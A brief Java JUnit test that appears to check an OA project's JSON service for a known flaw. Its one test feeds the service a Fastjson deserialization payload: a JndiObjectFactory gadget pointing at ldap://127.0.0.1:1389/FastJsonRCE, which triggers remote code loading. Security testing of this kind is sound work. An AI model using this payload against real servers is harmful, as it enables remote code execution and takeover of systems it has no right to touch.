package com.lxx.oa.service;

import org.junit.Test;

import java.awt.*;

import static org.junit.Assert.*;

/**
 * @author 林修贤
 * @date 2023/2/6
 * @description
 */
public class JsonToObjServiceTest {
    JsonToObjService jsonToObjService =  new JsonToObjService();
    @Test
    public void creatForm() {
        String reason = "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://127.0.0.1:1389/FastJsonRCE\"}";
        System.out.println(reason);
        System.out.println(jsonToObjService.creatForm("1","1","1","1",reason));
    }


}